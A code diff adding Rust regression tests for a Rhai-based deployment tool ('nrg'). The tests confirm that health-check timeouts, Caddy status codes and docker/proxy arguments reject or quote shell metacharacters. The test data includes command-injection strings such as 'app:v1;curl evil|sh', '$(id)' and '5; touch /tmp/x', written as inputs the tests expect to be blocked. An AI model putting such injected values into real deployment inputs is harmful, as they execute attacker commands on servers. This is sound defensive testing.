@@ -86,3 +86,120 @@ fn runtime_exec_cmd_container_name_cannot_inject_shell_commands() {
         "container_name injected a shell command via runtime_exec_cmd"
     );
 }
+
+/// Run `script` under `nrg exec --dry-run` in a fresh dir; returns (success, stdout, stderr).
+fn run_dry(script: &str) -> (bool, String, String) {
+    let dir = tempfile::tempdir().unwrap();
+    fs::create_dir_all(dir.path().join(".energize")).unwrap();
+    link_lib(dir.path());
+    fs::write(dir.path().join("Energize.rhai"), script).unwrap();
+    let out = Command::cargo_bin("nrg")
+        .unwrap()
+        .current_dir(dir.path())
+        .args(["exec", "--dry-run", "Energize.rhai"])
+        .output()
+        .unwrap();
+    (
+        out.status.success(),
+        String::from_utf8_lossy(&out.stdout).into_owned(),
+        String::from_utf8_lossy(&out.stderr).into_owned(),
+    )
+}
+
+/// Issue #10 — a non-integer health-check timeout used to pass the `timeout < 1` guard (Rhai
+/// evaluates `"5; x" < 1` as false) and was spliced raw into the remote curl command.
+#[test]
+fn health_timeout_must_be_an_integer() {
+    for (func, call) in [
+        (
+            "wait_healthy_on_host",
+            r#"hc::wait_healthy_on_host("web1", 8080, #{ timeout: "5; touch /tmp/x" });"#,
+        ),
+        (
+            "wait_healthy",
+            r#"hc::wait_healthy("http://localhost:1/up", #{ timeout: "5; touch /tmp/x" });"#,
+        ),
+    ] {
+        let (ok, out, err) = run_dry(&format!("import \"lib/healthcheck\" as hc;\n{call}"));
+        assert!(!ok, "{func} accepted a string timeout");
+        assert!(
+            err.contains("timeout must be an integer"),
+            "{func}: wrong failure: {err}"
+        );
+        assert!(
+            !out.contains("touch /tmp/x"),
+            "{func} planned the payload: {out}"
+        );
+    }
+}
+
+/// Issue #10 — a float timeout is rejected too.
+#[test]
+fn health_timeout_float_is_rejected() {
+    let (ok, _, err) = run_dry(
+        r#"import "lib/healthcheck" as hc;
+        hc::wait_healthy_on_host("web1", 8080, #{ timeout: 2.5 });"#,
+    );
+    assert!(!ok, "float timeout accepted");
+    assert!(err.contains("timeout must be an integer"), "{err}");
+}
+
+/// Issue #10 — a valid integer timeout still reaches the plan.
+#[test]
+fn health_timeout_integer_is_still_accepted() {
+    let (ok, _, err) = run_dry(
+        r#"import "lib/healthcheck" as hc;
+        hc::wait_healthy_on_host("web1", 8080, #{ timeout: 5 });"#,
+    );
+    assert!(ok, "integer timeout rejected: {err}");
+}
+
+/// Issue #10 — the caddy maintenance status code is concatenated into JSON; it must be an
+/// integer 100-599.
+#[test]
+fn caddy_maintenance_status_code_is_validated() {
+    for bad in [r#""503,\"evil\":1""#, "99", "600", "5.5"] {
+        let (ok, _, err) = run_dry(&format!(
+            "import \"lib/caddy\" as caddy;\ncaddy::proxy_maintenance(\"web1\", \"app\", true, #{{ status_code: {bad} }});"
+        ));
+        assert!(!ok, "status_code {bad} accepted");
+        assert!(
+            err.contains("status_code must be an integer 100-599"),
+            "{bad}: {err}"
+        );
+    }
+    let (ok, _, err) = run_dry(
+        r#"import "lib/caddy" as caddy;
+        caddy::proxy_maintenance("web1", "app", true, #{ status_code: 502 });"#,
+    );
+    assert!(ok, "valid status_code rejected: {err}");
+}
+
+/// Issue #10 item 4 — metacharacters in docker_run / caddy / kamal-proxy inputs reach the plan
+/// only as single-quoted words.
+#[test]
+fn docker_run_and_proxy_deploy_quote_metacharacters_in_the_plan() {
+    let (ok, out, err) = run_dry(
+        r#"import "lib/docker" as docker;
+        import "lib/caddy" as caddy;
+        import "lib/proxy" as proxy;
+        docker::docker_run("web1", "app:v1;curl evil|sh", "n$(id)", #{});
+        caddy::proxy_deploy("web1", "svc'x;id", "10.0.0.1:3000", #{ domain: "a.example.com" });
+        proxy::proxy_deploy("web1", "svc;id", "10.0.0.1:3000", #{ health_path: "/up;$(id)" });"#,
+    );
+    assert!(ok, "dry-run failed: {err}");
+    assert!(
+        out.contains("'app:v1;curl evil|sh'"),
+        "image not quoted: {out}"
+    );
+    assert!(out.contains("'n$(id)'"), "name not quoted: {out}");
+    assert!(
+        out.contains(r#"svc'\''x;id"#),
+        "caddy service not quoted: {out}"
+    );
+    assert!(out.contains("'svc;id'"), "proxy service not quoted: {out}");
+    assert!(
+        out.contains("'/up;$(id)'"),
+        "proxy health path not quoted: {out}"
+    );
+}
